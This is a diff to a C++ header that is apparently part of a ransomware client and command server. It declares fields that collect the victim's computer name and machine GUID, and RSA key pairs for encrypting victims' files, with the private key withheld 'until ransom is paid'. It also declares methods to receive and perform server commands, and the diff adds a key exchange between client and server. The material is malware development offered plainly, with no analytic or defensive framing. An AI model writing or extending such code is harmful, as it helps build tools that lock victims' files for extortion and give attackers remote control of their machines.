@@ -35,7 +35,7 @@ public:
 
 private:
     std::string        m_ComputerName   = "";  // remote host computer name. e.g DESKTOP-AJDU31S
-    std::string        m_MachineGUID    = "";  // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....
+    std::string        m_MachineGUID    = "";  // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
     RSAKeys            m_RequestSecrets = {}; // RSA key pair used to encrypt and decrypt requests to and from server
     RSAKeys            m_RansomSecrets  = {}; // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
     SOCKET             m_UDPSocket      = INVALID_SOCKET;
@@ -54,6 +54,7 @@ public:
     BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
     void               ListenForServerCommands();   // listen for commands from the server and perform them
     BOOL               PerformCommand(const ServerCommand& command, ClientResponse& outResponse); // Perform a command from the tcp server
+    BYTESTRING         GetCommand();
 
 
     template <typename _Ty>
@@ -70,10 +71,12 @@ private:
     BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
     BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
     BOOL               IsServerAwaitingResponse(const ServerCommand& commandPerformed);
+    BOOL               ExchangePublicKeys(); // send client public key, receive server public key
 
     ProcessManager     m_ProcMgr          = {};     // remote host process manager
     Server             m_TCPServerDetails = {};     // details describing the tcp server
     Server             m_UDPServerDetails = {};     // details about the UDP communication
+    ClientRSAKey       m_ClientKeys = {};
 
 #elif defined(SERVER_RELEASE)                       // Server only client implementation
 public:
@@ -90,6 +93,7 @@ public:
     long               ClientUID        = -1;       // unique client id for the server
     sockaddr_in        AddressInfo      = {};       // Address info for the eserver to send messages over udp 
     BOOL               Alive            = TRUE;
+    ServerRSAKey       ExchangedKeys    = {}; // client public key with server pub and private keys
 
     /*
         Implementation for event handling- to wait
